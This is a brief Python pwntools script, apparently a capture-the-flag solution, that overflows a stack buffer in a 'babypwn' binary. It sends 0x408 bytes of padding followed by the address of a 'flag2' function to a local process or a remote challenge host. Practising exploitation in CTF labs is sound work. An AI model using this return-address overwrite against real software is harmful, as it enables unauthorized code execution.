#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./babypwn')
elif debug == 0:
    p = remote('prob.vulnerable.kr', 20035)
elf = ELF('./babypwn', checksec=False)
addr_target = elf.sym['flag2']

pd = 'a' * 0x408
pd += p64(addr_target)
p.sendline(pd)
p.interactive()
